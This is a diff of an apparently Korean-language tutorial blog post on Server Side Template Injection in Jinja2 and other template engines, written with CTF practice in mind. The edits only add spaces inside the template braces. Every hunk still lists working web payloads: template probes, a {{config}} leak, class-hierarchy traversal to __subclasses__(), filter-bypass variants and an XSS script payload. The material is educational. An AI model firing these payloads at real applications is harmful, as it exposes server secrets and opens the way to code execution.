@@ -36,9 +36,9 @@ SSTI 취약점의 경우 사용하는 템플릿에 따라 공격구문이 모두
 <hr>
 
 ```javascript
-{{7*7}}
+{ {7*7} }
 ${7*7}
-${{7*7}}
+${ {7*7} }
 #{7*7}
 *{7*7}
 ```
@@ -71,8 +71,8 @@ SSTI 공격은 공격 대상에서 사용되고 있는 템플릿 종류는 매�
 기본적으로 Jinja2 Template에서 값을 출력 할 때 사용하는 구문은 {{ ... }} 을 사용한다.
 
 ```javascript
-http://uri~~/?name={{7*7}}
-http://uri~~/{{7*7}}
+http://uri~~/?name={ {7*7} } 
+http://uri~~/{ {7*7} }
 ```
 
 위와 같이 Jinja2 템플릿에서 사용되는 출력 구문인 {{…}}을 사용하여 수식을 넣었을 떄
@@ -89,7 +89,7 @@ CTF 에서 주로 사용되는 방식은?
 보통 CTF 에서 flag.txt를 추출하기위한 아주 기초적인 방법으로는 config 파일을 확인하면 되므로 아래와 같이 사용된다.
 
     ```c++
-    http://uri~~/?name={{config}}
+    http://uri~~/?name={ {config} }
     ``` 
 
 ![그림 1-5](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-4.png)
@@ -108,7 +108,7 @@ config.__class__
 파이썬의 경우 여러 클래스를 상속받을 수 있으며, 상속 받은 클래스를 .__base(.__bases__.)를 통해 확인할 수 있다.
 
 ```
-http://uri~~/?name={{''.__class__.__base__}}
+http://uri~~/?name={ {''.__class__.__base__} }
 ```
 
 위와 같은 구문을 통해 **<u style=color:"red">object 클래스에 접근</u>**할 수 있게 된다.
@@ -174,16 +174,16 @@ dict.__mro__[-1]
 (dict|attr("\x5f\x5fmro\x5f\x5f"))[-1]
 
 # From the "object" class call __subclasses__()
-{{ dict.__base__.__subclasses__() }}
-{{ dict.mro()[-1].__subclasses__() }}
-{{ (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() }}
+{ { dict.__base__.__subclasses__() } }
+{ { dict.mro()[-1].__subclasses__() } }
+{ { (dict.mro()[-1]|attr("\x5f\x5fsubclasses\x5f\x5f"))() } }
 
 
 # Other examples using these ways
-{{ ().__class__.__base__.__subclasses__() }}
-{{ [].__class__.__mro__[-1].__subclasses__() }}
-{{ ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() }}
-{{ request.__class__.mro()[-1].__subclasses__() }}
+{ { ().__class__.__base__.__subclasses__() } }
+{ { [].__class__.__mro__[-1].__subclasses__() } }
+{ { ((""|attr("__class__")|attr("__mro__"))[-1]|attr("__subclasses__"))() } }
+{ { request.__class__.mro()[-1].__subclasses__() } }
 ```
 
 # Bypass SSTI Filtering
@@ -195,14 +195,14 @@ dict.__mro__[-1]
 ## config Filtering
 
 ```python 
-{{ self.__dict__ }}
-{{ self['__dict__']}}
-{{ self|attr("__dict__") }}
-{{ self|attr("con"+"fig")}}
-{{ self.__getitem__('con'+'fig') }}
-{{ request.__dict__ }}
-{{ request['__dict__']}}
-{{ request.__getitem__('con'+'fig') }}
+{ { self.__dict__ } }
+{ { self['__dict__']} }
+{ { self|attr("__dict__") } }
+{ { self|attr("con"+"fig")} }
+{ { self.__getitem__('con'+'fig') } }
+{ { request.__dict__ } }
+{ { request['__dict__']} }
+{ { request.__getitem__('con'+'fig') } }
 ```
 
 ## .(dot) Filtering
@@ -240,9 +240,9 @@ http://localhost:5000/?c={{request|attr(request.args.f|format(request.args.a,req
 > SSTI 취약점이 존재할경우 XSS 취약점 또한 함께 점검해보자
 
 ```
-{{'<script>alert(1);</script>'}}
+{ {'<script>alert(1);</script>'} }
 OR
-{{'<script>alert(1);</script>'|safe}}
+{ {'<script>alert(1);</script>'|safe} }
 ```
 
 ![그림 1-7](/assets/image/vuln/web-vuln/Server%20Side%20Template%20Injection%20(SSTI)/image-6.png)**<u style=color:"red">이 외에도 SSTI를 통한 연계 공격과 수많은 Payload 들이 존재하며, 각 상황에 맞게 적절하게 찾아봐야할듯하다.</u>**
